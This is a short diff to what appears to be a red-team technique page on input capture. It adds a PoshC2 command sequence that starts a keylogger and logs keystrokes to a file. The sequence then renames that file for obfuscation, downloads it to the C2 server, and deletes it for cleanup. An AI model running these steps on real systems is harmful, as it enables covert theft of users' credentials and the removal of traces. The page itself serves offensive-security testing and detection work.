@@ -5,7 +5,22 @@ Adversaries may use methods of capturing user input to obtain credentials or col
 
 
 ## Exploit syntax:
-* (get-keystrokes)
+In Poshc2, Run
+```sh
+start-keystrokes ##Starts the Keylogger
+
+start-keystrokes-writefile ##record this file location(.log)
+
+### Keylogger is now running until Stopped ###
+
+copy "C:\keystroke file location" C:\sameplace with new filename ##Change the name for obfuscation/readability
+
+Download-file C:\sameplace with new filename ## Gets put into /var/poshc2/*projectname*/downloads
+
+Stop-Keystrokes ##Stop keylogger for cleanup
+
+posh-delete C:\sameplace with new filename ##Cleaning up file created
+```
 
 
 ## Detection Technique:
